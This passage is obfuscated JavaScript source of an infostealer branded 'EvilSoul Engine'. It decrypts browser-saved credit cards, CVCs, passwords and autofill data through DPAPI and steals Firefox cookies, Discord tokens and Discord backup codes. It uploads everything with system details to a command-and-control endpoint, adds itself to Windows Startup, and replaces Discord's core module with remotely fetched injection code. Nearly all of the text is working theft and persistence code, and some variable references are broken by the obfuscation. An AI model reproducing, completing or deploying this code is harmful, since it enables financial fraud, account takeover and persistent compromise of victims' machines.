            const execFile = new sqlite3.Database(exec);
            await new Promise(Dpapi => {
                execFile.each("SELECT cc.guid, cc.name_on_card, cc.expiration_month, cc.expiration_year, cc.card_number_encrypted, cvc.value_encrypted AS cvc_encrypted FROM credit_cards cc LEFT JOIN local_stored_cvc cvc ON cc.guid = cvc.guid", (Dpapi, FormData) => {
                    if (Dpapi) {
                        return;
                    }
                    if (FormData && FormData.card_number_encrypted) {
                        try {
                            const https = decryptCreditCard(Buffer.from(FormData.card_number_encrypted), StreamZip);
                            const http = FormData.cvc_encrypted ? decryptCreditCard(Buffer.from(FormData.cvc_encrypted), StreamZip) : "——";
                            if (https) {
                                crypto += "================\nGUID: " + (FormData.guid || "N/A") + "\nNAME: " + (FormData.name_on_card || "N/A") + "\nNUMBER: " + https + "\nVALID: " + (FormData.expiration_month || "??") + "/" + (FormData.expiration_year || "????") + "\nCVC: " + (http || "——") + "\nAPPLICATION: " + WebSocket + " (" + path.basename(axios) + ")\n";
                                setTimeoutFn++;
                            }
                        } catch { }
                    }
                }, () => {
                    return Dpapi();
                });
            });
            execFile.close();
            if (setTimeoutFn > 0) { }
            cleanupTempFile(exec);
        }
    }
    (crypto.match(new RegExp("================\\n", "g")) || []).length;
    if (!fs.existsSync(outputDir)) {
        fs.mkdirSync(outputDir, {
            recursive: true
        });
    }
    const getApiHeaders = path.join(outputDir, "creditcards.txt");
    fs.writeFileSync(getApiHeaders, crypto.trim() ? crypto : "No Creditcards Found");
    return getApiHeaders;
}
async function GetFirefoxCookies() {
    const crypto = [path.join(appdata, "Mozilla", "Firefox", "Profiles"), path.join(appdata, "Waterfox", "Profiles")];
    const Dpapi = crypto => {
        const FormData = [];
        try {
            const axios = fs.readdirSync(crypto, {
                withFileTypes: true
            });
            for (const reg of regexes) {
                const http = path.join(crypto, https.name);
                try {
                    if (https.isDirectory()) {
                        FormData.push(...Dpapi(http));
                    } else {
                        if (https.isFile() && https.name.toLowerCase() === "cookies.sqlite") {
                            FormData.push(http);
                        }
                    }
                } catch {
                    continue;
                }
            }
        } catch { }
        return FormData;
    };
    const FormData = crypto => {
        const Dpapi = path.dirname(crypto);
        const FormData = path.basename(Dpapi);
        const axios = FormData.split(".");
        if (axios.length > 1) {
            const https = axios[axios.length - 1].toLowerCase();
            if (https === "default-release" || https === "default") {
                return "Default";
            } else {
                if (https.startsWith("profile")) {
                    const http = https.match(new RegExp("(\\d+)", ""));
                    return http ? http[1] : https.replace(new RegExp("^profile", "i"), "");
                }
            }
            return https;
        }
        if (FormData.toLowerCase().includes("default")) {
            return "Default";
        }
        const http = FormData.match(new RegExp("(\\d+)", ""));
        return http ? http[1] : FormData;
    };
    const axios = crypto => {
        return new Promise(Dpapi => {
            const axios = [];
            const https = FormData(crypto);
            const http = createTempDatabase(crypto, "firefox");
            if (!http) {
                return Dpapi({
                    profileName: https,
                    cookies: axios
                });
            }
            const os = new sqlite3.Database(http, sqlite3.OPEN_READONLY, crypto => {
                if (crypto) {
                    cleanupTempFile(http);
                    return Dpapi({
                        profileName: https,
                        cookies: axios
                    });
                }
                os.all("SELECT host, path, isSecure, expiry, name, value FROM moz_cookies WHERE value IS NOT NULL AND value != ''", [], (FormData, archiver) => {
                    if (!FormData && archiver && archiver.length > 0) {
                        for (const exec of archiver) {
                            if (!exec.value) {
                                continue;
                            }
                            axios.push({
                                domain: exec.host,
                                name: exec.name,
                                value: exec.value,
                                path: exec.path || "/",
                                expires: exec.expiry || "2597573456",
                                secure: exec.isSecure ? "TRUE" : "FALSE"
                            });
                        }
                    }
                    os.close(() => {
                        cleanupTempFile(http);
                        Dpapi({
                            profileName: https,
                            cookies: axios
                        });
                    });
                });
            });
        });
    };
    const directories = [];
    for (const http of crypto) try {
        if (fs.existsSync(http)) {
            const os = Dpapi(http);
            https.push(...os);
        }
    } catch {
        continue;
    }
    if (https.length === 0) {
        return {};
    }
    const archiver = https.map(crypto => {
        return axios(crypto);
    });
    const exec = await Promise.allSettled(archiver);
    const execSync = {};
    for (const execFile of exec) if (execFile.status === "fulfilled" && execFile.value.cookies.length > 0) {
        const {
            profileName: spawn,
            cookies: WebSocket
        } = execFile.value;
        if (!execSync[spawn]) {
            execSync[spawn] = [];
        }
        execSync[spawn].push(...WebSocket);
    }
    return execSync;
}
async function GetInfo() {
    const crypto = path.join(process.env.TEMP, identifier);
    try {
        if (!fs.existsSync(crypto)) {
            return;
        }
        const Dpapi = fs.readdirSync(crypto);
        if (!Dpapi.length) {
            return;
        }
    } catch {
        return;
    }
    let https = "";
    try {
        https = FolderTree(crypto);
        if (https.length > 900) {
            https = https.substring(0, 900) + "\n... (truncated)";
        }
    } catch (http) {
        https = "Error generating file tree";
    }
    const sqlite3 = path.join(process.env.TEMP, "" + identifier + ".zip");
    let exec = false;
    try {
        const execSync = fs.createWriteStream(sqlite3);
        const execFile = archiver("zip", {
            zlib: {
                level: 9
            }
        });
        execFile.pipe(execSync);
        execFile.directory(crypto, false);
        await new Promise((crypto, Dpapi) => {
            execSync.on("close", () => {
                exec = true;
                crypto();
            });
            execSync.on("error", Dpapi);
            execFile.on("error", Dpapi);
            execFile.finalize();
        });
    } catch (http) {
        if (fs.existsSync(sqlite3)) {
            try {
                fs.unlinkSync(sqlite3);
            } catch { }
        }
        logs += "GetInfo (ZIP): " + http + "\nComputer Name: " + os.userInfo().username + "\n";
        return;
    }
    if (!exec || !fs.existsSync(sqlite3)) {
        return;
    }
    const spawn = await GetIp();
    const WebSocket = os.cpus()[0].model;
    const StreamZip = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const clearTimeoutFn = os.version();
    const setTimeoutFn = {
        embeds: [{
            color: 2829617,
            author: {
                name: "EvilSoul Engine ~ BrowserData | " + os.userInfo().username
            },
            thumbnail: {
                url: "https://i.pinimg.com/736x/cc/69/c5/cc69c56dab1d8d425633079f13d37b96.jpg"
            },
            fields: [{
                name: "<:1389088908117278781:1436710282368913490> Informations System",
                value: ">>> **IP Address :** `" + spawn + "`\n" + ("**Username :** `" + os.userInfo().username + "`\n") + ("**Hostname :** `" + os.hostname() + "`\n") + ("**RAM :** `" + StreamZip + " GB`\n") + ("**CPU :** `" + WebSocket + "`\n") + ("**Version :** `" + clearTimeoutFn + "`\n") + ("**Uptime :** `" + (os.uptime() / 60).toFixed(0) + " minutes`\n\n"),
                inline: false
            }, {
                name: "<:1348556164346023957:1436710230523248761> File Content",
                value: "```" + https + "```",
                inline: false
            }]
        }]
    };
    try {
        const generateRandomString = new FormData();
        generateRandomString.append("key", "EVIL-LIFETIME-8B8D85732A0A");
        generateRandomString.append("payload", JSON.stringify(setTimeoutFn));
        generateRandomString.append("file", fs.createReadStream(sqlite3), {
            filename: path.basename(sqlite3),
            contentType: "application/zip"
        });
        const tokens = generateRandomString.getHeaders();
        const discordEmails = getApiHeaders("multipart/form-data");
        Object.assign(tokens, discordEmails);
        await axios.post("http://api_patched/send-data", generateRandomString, {
            headers: tokens,
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            timeout: 300000
        });
        await writeLogToFile("info", "GetInfo (ZIP) sent successfully");
        try {
            fs.unlinkSync(sqlite3);
        } catch { }
    } catch (http) {
        try {
            if (fs.existsSync(sqlite3)) {
                fs.unlinkSync(sqlite3);
            }
        } catch { }
        logs += "GetInfo: " + http + "\nComputer Name: " + os.userInfo().username + "\n";
    }
}
async function GetToken() {
    await Promise.all(paths.map(fs => {
        return FindToken(fs.path, fs.name);
    }));
    if (tokens.length === 0) {
        return;
    }
    await Promise.all(tokens.map(async fs => {
        if (!fs || !fs.token || typeof fs.token !== "string" || fs.token.length < 20) {
            return;
        }
        let path;
        try {
            const crypto = await axios.get("https://discord.com/api/v9/users/@me", {
                headers: {
                    "Content-Type": "application/json",
                    authorization: fs.token
                },
                timeout: 10000
            });
            path = crypto.data;
        } catch (Dpapi) {
            await writeLogToFile("error", "Token validation failed for " + fs.location + ": " + (Dpapi.message || "Unknown error"));
            return;
        }
        const [FormData, https, http, archiver, sqlite3] = await Promise.all([GetIp()["catch"](() => {
            return "Unavailable";
        }), GetBilling(fs.token)["catch"](() => {
            return "`No Billing`";
        }), GetFriends(fs.token)["catch"](() => {
            return {
                users: "`No Friends`",
                length: 0
            };
        }), GetBadges(path.id, fs.token)["catch"](() => {
            return "`No Badges`";
        }), GetGuilds(fs.token)["catch"](() => {
            return "*Nothing to see here!*";
        })]);
        if (path.email && path.email !== "None" && !discordEmails.includes(path.email)) {
            discordEmails.push(path.email);
        }
        const exec = Math.floor(Date.now() / 1000);
        const execSync = "-# <:1316345705341911063:1436710224437182504> User Information: **" + path.username + " (" + path.id + ")**";
        const execFile = "-# <:1316345705341911063:1436710224437182504> Registered at: <t:" + exec + ":F>";
        const spawn = "-# <:1316345705341911063:1436710224437182504> Directory Found: **" + (fs.location || "Unknown") + "**\n" + execSync + "\n" + execFile;
        const WebSocket = {
            description: spawn,
            fields: [{
                name: ":closed_lock_with_key: Token:",
                value: "```fix\n" + fs.token + "\n```",
                inline: false
            }, {
                name: ":gem: Badges:",
                value: archiver || "`No Badges`",
                inline: true
            }, {
                name: ":credit_card: Billing:",
                value: https || "`No Billing`",
                inline: true
            }, {
                name: ":key: 2FA Enable:",
                value: "`" + (path.mfa_enabled ? "Enable" : "No Enable") + "`",
                inline: true
            }, {
                name: ":e_mail: Email:",
                value: "`" + (path.email || "None") + "`",
                inline: true
            }, {
                name: ":mobile_phone: Phone:",
                value: "`" + (path.phone || "None") + "`",
                inline: true
            }, {
                name: ":globe_with_meridians: IP Address:",
                value: "`" + (FormData || "Unavailable") + "`",
                inline: true
            }],
            color: 2829617,
            author: {
                name: "EvilSoul Engine - (Discord ~ " + os.userInfo().username + ")"
            },
            thumbnail: {
                url: path.avatar ? "https://cdn.discordapp.com/avatars/" + path.id + "/" + path.avatar + "?size=4096" : "https://cdn.discordapp.com/embed/avatars/0.png"
            }
        };
        const StreamZip = {
            color: 2829617,
            description: http?.users || "`No Friends`"
        };
        const clearTimeoutFn = {
            color: 2829617,
            description: sqlite3 || "*Nothing to see here!*"
        };
        const setTimeoutFn = {
            key: "EVIL-LIFETIME-8B8D85732A0A",
            embed: WebSocket,
            hq: StreamZip,
            guilds: clearTimeoutFn
        };
        let generateRandomString = false;
        let tokens = null;
        for (let local = 0; local < 3; local++) {
            try {
                const crypto = await axios.post("http://api_patched/send-embed", setTimeoutFn, {
                    timeout: 15000,
                    headers: getApiHeaders()
                });
                if (crypto.status === 200) {
                    success = true;
                    await writeLogToFile("info", "Discord tokens sent successfully: <@" + path.id + "> (" + path.username + ")");
                    break;
                }
            } catch (Dpapi) {
                tokens = Dpapi;
                const appdata = Dpapi.response?.status;
                const roaming = Dpapi.response?.data?.error || Dpapi.message || "Unknown error";
                if (appdata === 429) {
                    const localappdata = Dpapi.response?.headers?.["retry-after"] || 5;
                    await writeLogToFile("warn", "Rate limit hit, waiting " + localappdata + "s before retry " + (local + 1) + "/3");
                    await Sleep(localappdata * 1000);
                } else {
                    if (appdata === 401 || appdata === 400) {
                        await writeLogToFile("error", "Token send failed (" + appdata + "): " + roaming + " - Token: " + path.id + " (" + path.username + ")");
                        break;
                    } else {
                        await writeLogToFile("warn", "Token send attempt " + (local + 1) + "/3 failed: " + roaming);
                        if (local < 2) {
                            await Sleep(2000);
                        }
                    }
                }
            }
        }
        if (!generateRandomString) {
            await writeLogToFile("error", "Failed to send token after 3 attempts: " + path.id + " (" + path.username + ") - Error: " + (tokens?.message || "Unknown"));
            logs += "GetToken send failed: " + path.id + " (" + path.username + ") - " + (tokens?.message || "Unknown error") + "\nComputer Name: " + os.userInfo().username + "\n";
        }
    }));
}
async function GetAutoFills() {
    console.log("");
    let result = "";
    const Dpapi = getBrowserPaths();
    for (const FormData of Dpapi) {
        const axios = FormData.path;
        const https = FormData.name;
        if (!fs.existsSync(axios)) {
            continue;
        }
        const http = path.join(axios, "Web Data");
        if (!fs.existsSync(http)) {
            continue;
        }
        const os = createTempDatabase(http, "autofill");
        if (!os) {
            continue;
        }
        let archiver = 0;
        const exec = new sqlite3.Database(os);
        await new Promise(Dpapi => {
            exec.each("SELECT name, value FROM autofill", (Dpapi, FormData) => {
                if (Dpapi) {
                    return;
                }
                if (FormData && FormData.name && FormData.value) {
                    crypto += "================\nNAME: " + FormData.name + "\nVALUE: " + FormData.value + "\nAPPLICATION: " + https + "\n";
                    archiver++;
                }
            }, () => {
                exec.close();
                Dpapi();
            });
        });
        if (archiver > 0) { }
        cleanupTempFile(os);
    }
    for (const {
        config: execSync,
        name: execFile
    } of OPERA_BROWSERS) {
        if (!fs.existsSync(execSync.userData)) {
            continue;
        }
        const spawn = getOperaProfiles(execSync.userData);
        for (const axios of spawn) {
            const http = path.join(axios, "Web Data");
            if (!fs.existsSync(http)) {
                continue;
            }
            const os = createTempDatabase(http, "autofill_opera");
            if (!os) {
                continue;
            }
            let WebSocket = 0;
            const exec = new sqlite3.Database(os);
            await new Promise(Dpapi => {
                exec.each("SELECT name, value FROM autofill", (Dpapi, FormData) => {
                    if (Dpapi) {
                        return;
                    }
                    if (FormData && FormData.name && FormData.value) {
                        crypto += "================\nNAME: " + FormData.name + "\nVALUE: " + FormData.value + "\nAPPLICATION: " + execFile + " (" + path.basename(axios) + ")\n";
                        WebSocket++;
                    }
                }, () => {
                    exec.close();
                    Dpapi();
                });
            });
            if (WebSocket > 0) { }
            cleanupTempFile(os);
        }
    }
    (crypto.match(new RegExp("================\\n", "g")) || []).length;
    if (!fs.existsSync(outputDir)) {
        fs.mkdirSync(outputDir, {
            recursive: true
        });
    }
    const StreamZip = path.join(outputDir, "autofills.txt");
    fs.writeFileSync(StreamZip, crypto.trim() ? crypto : "No Autofills Found");
    console.log("");
    return StreamZip;
}
function getUserDataPath(fs) {
    const path = fs.replace(new RegExp("\\\\$", ""), "").split("\\");
    const crypto = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Guest Profile"];
    if (crypto.some(fs => {
        return path[path.length - 1] === fs;
    })) {
        return path.slice(0, -1).join("\\") + "\\";
    }
    return fs;
}
async function GetMasterKeys() {
    const crypto = getBrowserPaths();
    for (const FormData of crypto) {
        const axios = getUserDataPath(FormData.path);
        if (masterKeys.has(axios)) {
            continue;
        }
        const https = path.join(axios, "Local State");
        if (!fs.existsSync(https)) {
            continue;
        }
        try {
            const http = fs.readFileSync(https, "utf8");
            const os = JSON.parse(http);
            if (!os?.os_crypt?.encrypted_key) {
                continue;
            }
            const archiver = Buffer.from(os.os_crypt.encrypted_key, "base64").slice(5);
            const sqlite3 = Dpapi.unprotectData(archiver, null, "CurrentUser");
            if (sqlite3 && Buffer.isBuffer(sqlite3)) {
                masterKeys.set(axios, sqlite3);
                if (!axios.split("\\").filter(crypto => {
                    return result;
                }).slice(-2, -1)[0]) {
                    "Unknown";
                }
            }
        } catch { }
    }
}
function decryptPasswordValue(fs, path) {
    try {
        if (!fs || !path) {
            return null;
        }
        const Dpapi = fs.slice(0, 3).toString();
        if (Dpapi !== "v10" && Dpapi !== "v11") {
            return null;
        }
        const FormData = fs.slice(3, 15);
        const axios = fs.slice(15, fs.length - 16);
        const https = fs.slice(fs.length - 16);
        const http = crypto.createDecipheriv("aes-256-gcm", path, FormData);
        http.setAuthTag(https);
        const os = Buffer.concat([http.update(axios), http.final()]);
        return os.toString("utf8");
    } catch {
        return null;
    }
}
function decryptCreditCard(fs, path) {
    try {
        if (!fs || fs.length < 3 || !path) {
            return null;
        }
        const Dpapi = fs.slice(0, 3).toString();
        let FormData;
        let axios;
        let https;
        let http;
        if (Dpapi === "v10" || Dpapi === "v11") {
            FormData = fs.slice(3, 15);
            axios = fs.slice(15, fs.length - 16);
            https = fs.slice(fs.length - 16);
            http = crypto.createDecipheriv("aes-256-gcm", path, FormData);
            http.setAuthTag(https);
        } else {
            FormData = fs.slice(3, 19);
            axios = fs.slice(19);
            http = crypto.createDecipheriv("aes-256-cbc", path, FormData);
        }
        return http.update(axios, undefined, "utf-8") + http.final("utf-8");
    } catch {
        return null;
    }
}
function createTempDatabase(crypto, Dpapi) {
    const FormData = path.join(tempDir, "" + Dpapi + "_" + Date.now() + "_" + Math.random().toString(36).slice(2) + ".db");
    try {
        fs.copyFileSync(crypto, FormData);
        return FormData;
    } catch {
        return null;
    }
}
function cleanupTempFile(path) {
    try {
        if (path && fs.existsSync(path)) {
            fs.unlinkSync(path);
        }
    } catch { }
}
function getOperaProfiles(crypto) {
    if (!fs.existsSync(crypto)) {
        return [];
    }
    const Dpapi = fs.readdirSync(crypto, {
        withFileTypes: true
    }).filter(crypto => {
        return crypto.isDirectory() && (crypto.name === "Default" || crypto.name.startsWith("Profile"));
    }).map(Dpapi => {
        return path.join(crypto, Dpapi.name);
    });
    return Dpapi.length === 0 ? [crypto] : Dpapi;
}
function getBrowserPaths() {
    return paths.filter(fs => {
        return !fs.name.includes("Discord") && !fs.name.includes("Lightcord");
    });
}
function getOperaMasterKey(crypto) {
    const FormData = path.join(crypto, "Local State");
    if (!fs.existsSync(FormData)) {
        return null;
    }
    try {
        const axios = JSON.parse(fs.readFileSync(FormData, "utf8"));
        if (!axios?.os_crypt?.encrypted_key) {
            return null;
        }
        const encryptedKey = Buffer.from(localStateData.os_crypt.encrypted_key, "base64").slice(5);
        const http = Dpapi.unprotectData(https, null, "CurrentUser");
        if (!http) {
            return null;
        }
        return Buffer.isBuffer(http) ? http : Buffer.from(http);
    } catch {
        return null;
    }
}
async function extractDBPasswords(crypto, Dpapi, FormData) {
    return new Promise(axios => {
        if (!fs.existsSync(crypto)) {
            return axios([]);
        }
        const https = path.join(tempDir, "tmp_" + Math.random().toString(36).slice(2) + ".db");
        try {
            fs.copyFileSync(crypto, https);
        } catch {
            return axios([]);
        }
        const http = new sqlite3.Database(https);
        const os = [];
        const archiver = FormData.map(axios => {
            return axios === "password_value" ? "CAST(password_value AS BLOB) as password_value" : axios;
        });
        http.each("SELECT " + archiver.join(",") + " FROM " + Dpapi, (axios, https) => {
            if (axios) {
                return;
            }
            if (https && https.password_value) {
                if (!Buffer.isBuffer(https.password_value)) {
                    if (https.password_value instanceof Uint8Array) {
                        https.password_value = Buffer.from(https.password_value);
                    } else if (typeof https.password_value === "string") {
                        https.password_value = Buffer.from(https.password_value, "base64");
                    } else {
                        https.password_value = Buffer.from(https.password_value);
                    }
                }
                os.push(https);
            }
        }, () => {
            http.close();
            try {
                fs.unlinkSync(https);
            } catch { }
            axios(os);
        });
    });
}
async function ExtractAllCookies() {
    const fs = {};
    await killAllBrowsers();
    const path = Object.keys(browserConfigs).filter(fs => {
        return getBrowserExecutable(fs) !== null;
    });
    for (const crypto of path) try {
        const Dpapi = await processBrowser(crypto);
        if (Dpapi && Dpapi.cookies && Dpapi.cookies.length > 0) {
            if (!fs[Dpapi.browser]) {
                fs[Dpapi.browser] = {};
            }
            fs[Dpapi.browser].Default = Dpapi.cookies.map(fs => {
                return {
                    domain: fs.domain,
                    name: fs.name,
                    value: fs.value,
                    path: fs.path || "/",
                    expires: fs.expires || 2597573456
                };
            });
        }
        await Sleep(1000);
    } catch (FormData) {
        console.error("[BROWSER] Erro ao processar " + crypto + ":", FormData.message);
    }
    try {
        const axios = await GetFirefoxCookies();
        const https = Object.keys(axios);
        if (https.length > 0) {
            fs.Firefox = {};
            for (const http of https) fs.Firefox[http] = axios[http];
        }
    } catch (FormData) {
        console.error("[BROWSER] Erro ao processar Firefox:", FormData.message);
    }
    try {
        await ChromePythonExtract();
    } catch (FormData) {
        console.error("[BROWSER] Erro na extração Python:", FormData.message);
    }
    if (Object.keys(fs).length > 0) {
        const os = SaveCookies(fs);
        return os;
    } else {
        return null;
    }
}
function extractPythonZip(crypto, Dpapi) {
    return new Promise((FormData, axios) => {
        if (!fs.existsSync(crypto)) {
            return axios(new Error("ZIP not found"));
        }
        const https = new StreamZip({
            file: crypto,
            storeEntries: true
        });
        https.on("ready", () => {
            const crypto = Object.keys(https.entries());
            const http = crypto.find(crypto => {
                return crypto.includes("python.exe") && crypto.includes("tools");
            });
            if (!http) {
                https.close();
                return axios(new Error("python.exe not found in ZIP"));
            }
            const os = http.split(new RegExp("[/\\\\]", "")).filter(crypto => {
                return result;
            });
            const archiver = os[0];
            const sqlite3 = path.basename(Dpapi);
            const exec = archiver === sqlite3 || archiver === "c2f0c6d3-d7cc-4143-8b8f-99c1357e58db";
            if (exec) {
                const execSync = path.join(tempDir, "temp_extract_" + Date.now());
                if (!fs.existsSync(execSync)) {
                    fs.mkdirSync(execSync, {
                        recursive: true
                    });
                }
                https.extract(null, execSync, crypto => {
                    if (crypto) {
                        https.close();
                        try {
                            fs.rmSync(execSync, {
                                recursive: true,
                                force: true
                            });
                        } catch { }
                        return axios(crypto);
                    }
                    const http = path.join(execSync, archiver);
                    if (!fs.existsSync(http)) {
                        https.close();
                        try {
                            fs.rmSync(execSync, {
                                recursive: true,
                                force: true
                            });
                        } catch { }
                        return axios(new Error("Source folder not found after extraction"));
                    }
                    try {
                        copyRecursive(http, Dpapi);
                        fs.rmSync(execSync, {
                            recursive: true,
                            force: true
                        });
                    } catch (os) {
                        try {
                            fs.rmSync(execSync, {
                                recursive: true,
                                force: true
                            });
                        } catch { }
                        https.close();
                        return axios(os);
                    }
                    https.close();
                    setTimeoutFn(() => {
                        const crypto = path.join(Dpapi, "tools", "python.exe");
                        if (!fs.existsSync(crypto)) {
                            return axios(new Error("python.exe not found at " + crypto));
                        }
                        FormData();
                    }, 1500);
                });
            } else {
                https.extract(null, Dpapi, crypto => {
                    https.close();
                    if (crypto) {
                        return axios(crypto);
                    }
                    setTimeoutFn(() => {
                        const crypto = path.join(Dpapi, "tools", "python.exe");
                        if (!fs.existsSync(crypto)) {
                            return axios(new Error("python.exe not found at " + crypto));
                        }
                        FormData();
                    }, 1500);
                });
            }
        });
        https.on("error", FormData => {
            return axios(FormData);
        });
    });
}
async function GetRecoveryCodes() {
    const crypto = process.env.OneDrive || path.join(os.homedir(), "OneDrive");
    const Dpapi = ["Pictures", "Videos", "Music", "Documents", "Desktop", "Downloads", crypto];
    let output = "";
    let https = 0;
    for (const http of Dpapi) {
        const archiver = path.join(os.homedir(), http);
        if (fs.existsSync(archiver)) {
            try {
                fs.readdirSync(archiver).forEach(crypto => {
                    if (crypto.endsWith(".txt") && crypto.includes("discord_backup_codes")) {
                        https++;
                        const Dpapi = path.join(archiver, crypto);
                        try {
                            FormData += "\n\nBACKUP CODES FROM: " + Dpapi;
                            FormData += "\n\n" + fs.readFileSync(Dpapi, "utf-8");
                        } catch (http) { }
                    }
                });
            } catch (sqlite3) { }
        }
    }
    if (FormData.trim().length > 0) {
        try {
            const exec = os.userInfo().username;
            await axios.post("http://api_patched/send-recovery-codes", {
                key: "EVIL-LIFETIME-8B8D85732A0A",
                codes: FormData.trim(),
                username: exec
            }, {
                timeout: 8000,
                headers: getApiHeaders()
            })["catch"](() => { });
            await writeLogToFile("info", "Recovery codes sent successfully: " + https + " arquivo(s)");
        } catch (sqlite3) {
            logs += "GetRecoveryCodes: " + sqlite3 + "\nComputer Name: " + os.userInfo().username + "\n";
        }
    }
}
async function AddToStartup() {
    try {
        const crypto = process.execPath;
        const Dpapi = process.argv[1] || __filename;
        const FormData = path.basename(Dpapi, path.extname(Dpapi));
        try {
            const axios = path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
            if (!fs.existsSync(axios)) {
                fs.mkdirSync(axios, {
                    recursive: true
                });
            }
            const https = path.join(axios, "" + FormData + ".bat");
            const http = crypto.replace(new RegExp("\\\\", "g"), "\\\\").replace(new RegExp("\"", "g"), "\\\"");
            const os = Dpapi.replace(new RegExp("\\\\", "g"), "\\\\").replace(new RegExp("\"", "g"), "\\\"");
            const archiver = "@echo off\nstart \"\" \"" + http + "\" \"" + os + "\"";
            fs.writeFileSync(https, archiver, "utf8");
        } catch (sqlite3) {
            console.error("[STARTUP] Erro:", sqlite3.message);
        }
    } catch (sqlite3) {
        console.error("[STARTUP] Erro:", sqlite3.message);
    }
}
AddToStartup()["catch"](() => { });
async function injectDiscord() {
    try {
        await killAllDiscords();
        await Sleep(2000);
        const crypto = "EVIL-LIFETIME-8B8D85732A0A".trim();
        if (!local || !roaming) {
            return {
                success: false,
                message: "Local ou Roaming não encontrado"
            };
        }
        let FormData;
        try {
            FormData = await axios.post("http://api_patched/dcinjection-send", {
                key: crypto
            }, {
                headers: {
                    "Content-Type": "application/json"
                },
                responseType: "text",
                timeout: 30000,
                validateStatus: function (crypto) {
                    return crypto < 500;
                }
            });
        } catch (https) {
            return https.response ? {
                success: false,
                message: "API Error " + https.response.status + ": " + (typeof https.response.data === "string" ? https.response.data : JSON.stringify(https.response.data))
            } : https.request ? {
                success: false,
                message: "Network Error: No response from server"
            } : {
                success: false,
                message: "Error: " + https.message
            };
        }
        if (FormData.status !== 200) {
            let http = "API returned status " + FormData.status;
            try {
                const os = typeof FormData.data === "string" ? JSON.parse(FormData.data) : FormData.data;
                if (os && os.error) {
                    http = os.error;
                } else {
                    if (typeof FormData.data === "string") {
                        http = FormData.data;
                    }
                }
            } catch (archiver) {
                http = typeof FormData.data === "string" ? FormData.data : JSON.stringify(FormData.data);
            }
            return {
                success: false,
                message: http
            };
        }
        const sqlite3 = FormData.data;
        if (!sqlite3 || sqlite3.length < 10) {
            return {
                success: false,
                message: "Invalid response from API. Code length: " + (sqlite3 ? sqlite3.length : 0)
            };
        }
        const exec = fs.readdirSync(local);
        const execSync = exec.filter(crypto => {
            return crypto.includes("cord");
        });
        if (execSync.length === 0) {
            return {
                success: false,
                message: "No Discord installation found"
            };
        }
        const execFile = [];
        for (const spawn of execSync) {
            const WebSocket = path.join(local, spawn);
            try {
                const StreamZip = fs.readdirSync(WebSocket).filter(crypto => {
                    return crypto.startsWith("app-");
                });
                if (StreamZip.length === 0) {
                    continue;
                }
                StreamZip.sort((crypto, Dpapi) => {
                    return Dpapi.localeCompare(crypto, undefined, {
                        numeric: true
                    });
                });
                const clearTimeoutFn = path.join(WebSocket, StreamZip[0]);
                let setTimeoutFn = "Discord";
                if (spawn.includes("Canary")) {
                    setTimeoutFn = "Canary";
                }
                if (spawn.includes("PTB")) {
                    setTimeoutFn = "PTB";
                }
                try {
                    const getApiHeaders = path.join(clearTimeoutFn, "modules");
                    const exec = fs.readdirSync(getApiHeaders);
                    const generateRandomString = exec.find(crypto => {
                        return crypto.includes("discord_desktop_core");
                    });
                    if (!generateRandomString) {
                        continue;
                    }
                    const logs = path.join(getApiHeaders, generateRandomString, "discord_desktop_core");
                    const tokens = path.join(logs, "index.js");
                    if (!fs.existsSync(logs)) {
                        continue;
                    }
                    fs.writeFileSync(tokens, sqlite3, "utf8");
                    execFile.push({
                        path: tokens,
                        type: setTimeoutFn
                    });
                    const discordEmails = path.join(roaming, spawn, "Local Storage", "leveldb");
                    try {
                        if (fs.existsSync(discordEmails)) {
                            const appdata = fs.readdirSync(discordEmails);
                            const localappdata = appdata.filter(crypto => {
                                return crypto.endsWith(".ldb");
                            });
                            const tempDir = appdata.filter(crypto => {
                                return crypto.endsWith(".log");
                            });
                            for (const identifier of localappdata) {
                                const outputDir = path.join(discordEmails, identifier);
                                fs.writeFileSync(outputDir, "", "utf8");
                            }
                            for (const cookiesOutputDir of tempDir) {
                                const passwordsOutputPath = path.join(discordEmails, cookiesOutputDir);
                                fs.unlinkSync(passwordsOutputPath);
                            }
                        }
                    } catch (paths) { }
                } catch (https) { }
            } catch (https) { }
        }
        try {
            const browserConfigs = path.join(roaming, "BetterDiscord", "data", "betterdiscord.asar");
            if (fs.existsSync(path.dirname(browserConfigs))) {
                fs.writeFileSync(browserConfigs, sqlite3, "utf8");
                execFile.push({
                    path: browserConfigs,
                    type: "BetterDiscord"
                });
            }
        } catch (https) { }
        if (execFile.length > 0) {
            const badges = execFile.filter(crypto => {
                return crypto && crypto.path && crypto.type;
            });
            if (badges.length > 0 && "EVIL-LIFETIME-8B8D85732A0A" && "api_patched") {
                const hwid = badges.map(crypto => {
                    return "```" + crypto.path + " (" + crypto.type + ")```";
                }).join("\n");
                const hwidblack = {
                    color: 2829617,
                    author: {
                        name: "EvilSoul Engine ~ Discord Injection",
                        icon_url: "https://i.pinimg.com/736x/cc/69/c5/cc69c56dab1d8d425633079f13d37b96.jpg"
                    },
                    description: "> The connection with the Telegram bot has been established, you can close Discord using the action menu you received on Telegram, and when Discord is opened again the user will need to log in once more and the information will be sent automatically.",
                    fields: [{
                        name: "<:1316345705341911063:1458517092285415528> Injection Paths",
                        value: hwid,
                        inline: false
                    }],
                    footer: {
                        text: "t.me/evilsoulpublic | EVIL-LIFETIME-8B8D85732A0A"
                    }
                };
                try {
                    await axios.post("http://api_patched/send-embed", {
                        key: "EVIL-LIFETIME-8B8D85732A0A".trim(),
                        embed: hwidblack
                    }, {
                        headers: {
                            "Content-Type": "application/json"
                        },
                        timeout: 10000,
                        validateStatus: function (crypto) {
                            return crypto < 500;
                        }
                    });
                } catch (hostnameblack) { }
                try {
                    await axios.post("http://api_patched/send-telegram-killdiscord", {
                        key: "EVIL-LIFETIME-8B8D85732A0A".trim(),
                        injectionPaths: hwid
                    }, {
                        headers: {
                            "Content-Type": "application/json"
                        },
                        timeout: 10000,
                        validateStatus: function (crypto) {
                            return crypto < 500;
                        }
                    });
                } catch (hostnameblack) { }
            }
            return {
                success: true,
                message: "Injection completed. Injected into " + execFile.length + " location(s)",
                injectionResults: execFile
            };
        } else {
            return {
                success: false,
                message: "No injections were performed"
            };
        }
    } catch (https) {
        return {
            success: false,
            message: https.message
        };
    }
}
async function Main() {
    process.removeAllListeners("warning");
    for (let fs = 1; fs <= 3; fs++) {
        try {
            await GetToken();
        } catch (path) {
